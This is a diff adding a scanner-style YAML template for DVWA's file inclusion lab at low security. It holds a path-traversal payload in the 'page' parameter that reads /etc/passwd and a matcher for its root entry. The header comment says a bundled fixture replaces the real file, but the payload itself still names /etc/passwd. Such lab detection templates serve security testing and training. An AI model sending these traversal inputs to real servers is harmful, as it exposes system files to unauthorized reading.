@@ -1,0 +1,25 @@
+# DVWA File Inclusion (Low), native template v2.
+# Local authorized lab only: reading the bundled fixture stands in for
+# /etc/passwd, so no real system file is touched.
+id: dvwa-file-inclusion
+info:
+  name: DVWA File Inclusion (Low)
+  author: xiangfuhua
+  severity: high
+  description: >-
+    DVWA's file inclusion module at low security passes the page parameter to
+    an include without validation. A match on the passwd format proves an
+    arbitrary file was read from the target.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,lfi,lab
+method: GET
+path: /vulnerabilities/fi/
+payload:
+  page: "../../../../../etc/passwd"
+headers:
+  Cookie: "PHPSESSID=mock; security=low"
+matchers:
+  - type: regex
+    regex:
+      - "root:x:0:0"
